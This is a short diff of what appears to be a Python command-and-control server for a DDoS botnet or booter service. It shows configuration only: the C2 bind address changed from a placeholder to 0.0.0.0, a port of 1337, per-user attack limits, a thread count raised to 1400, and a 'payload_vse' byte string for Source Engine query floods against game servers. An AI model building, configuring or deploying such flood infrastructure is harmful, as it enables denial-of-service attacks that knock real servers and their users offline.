@@ -12,12 +12,12 @@ import errno
 import select
 
 # Configuration
-C2_ADDRESS = "your ip vps"
+C2_ADDRESS = "0.0.0.0"
 C2_PORT = 1337
 MAX_USERS = 50
 MAX_ATTACKS_PER_USER = 10
 BUFFER_SIZE = 2048
-MAX_THREADS = 1000
+MAX_THREADS = 1400
 
 # Payloads
 payload_vse = b"\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65\x20\x51\x75\x65\x72\x79\x00"
